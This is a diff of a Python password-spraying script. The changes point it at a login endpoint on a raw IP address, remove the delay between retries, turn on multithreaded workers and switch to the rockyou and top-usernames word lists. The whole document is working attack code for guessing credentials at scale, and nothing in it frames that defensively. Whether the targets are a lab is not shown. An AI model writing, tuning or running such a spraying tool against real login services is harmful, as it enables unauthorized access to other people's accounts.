@@ -14,6 +14,8 @@ print_lock = threading.Lock()
 # url = "https://www.google.com/webhp"
 url = "http://34.224.51.201:5050/login"
 # url = "https://reqbin.com/api/v1/ip"
+url = "http://54.234.93.154:5050/login"
+
 # Define headers (optional)
 # headers = {
 #     'User-Agent': 'Mozilla/5.0',
@@ -82,7 +84,11 @@ def attempt_login(username, password, max_retries=3):
 
             # Adding a timeout of 10 seconds for the request
             # response = requests.post(url, json=data, proxies=proxy)
-            response = requests.post(url, json=data, 
+            # response = requests.post(url, json=data, 
+            #                         #  proxies=proxy, 
+            #                          headers=headers)
+
+            response = requests.get(url, json=data, 
                                     #  proxies=proxy, 
                                      headers=headers)
 
@@ -112,19 +118,19 @@ def attempt_login(username, password, max_retries=3):
 
         # Retry by increasing the retry count
         # retries += 1
-        time.sleep(2)  # Optional: Add delay before retrying
+        # time.sleep(2)  # Optional: Add delay before retrying
 
 # Function to perform password spraying
 def password_spray(usernames, passwords):
     # Using ThreadPoolExecutor to manage a pool of threads
-    # with ThreadPoolExecutor(max_workers=10) as executor:
-    #     # Iterate through each username and try each password
-    #     for username in usernames:
-    #         for password in passwords:
-    #             executor.submit(attempt_login, username, password)
-    for username in usernames:
-        for password in passwords:
-            attempt_login(username, password, 5)
+    with ThreadPoolExecutor(max_workers=5) as executor:
+        # Iterate through each username and try each password
+        for username in usernames:
+            for password in passwords:
+                executor.submit(attempt_login, username, password)
+    # for username in usernames:
+    #     for password in passwords:
+    #         attempt_login(username, password, 5)
 
 # Run the password spray
 if __name__ == "__main__":
@@ -132,11 +138,11 @@ if __name__ == "__main__":
     base_dir = os.path.dirname(os.path.abspath(__file__))
 
     # Build paths relative to the script's directory
-    # username_file_path = os.path.join(base_dir, 'data', 'TestInput', 'top-usernames.txt')
-    # password_file_path = os.path.join(base_dir, 'data', 'TestInput', 'rockyou-500.txt')
+    username_file_path = os.path.join(base_dir, 'data', 'TestInput', 'top-usernames.txt')
+    password_file_path = os.path.join(base_dir, 'data', 'TestInput', 'rockyou-500.txt')
 
-    username_file_path = os.path.join(base_dir, 'data', 'TestInputSmall', 'username.txt')
-    password_file_path = os.path.join(base_dir, 'data', 'TestInputSmall', 'password.txt')
+    # username_file_path = os.path.join(base_dir, 'data', 'TestInputSmall', 'username.txt')
+    # password_file_path = os.path.join(base_dir, 'data', 'TestInputSmall', 'password.txt')
     
 
     # Read the usernames and passwords from files
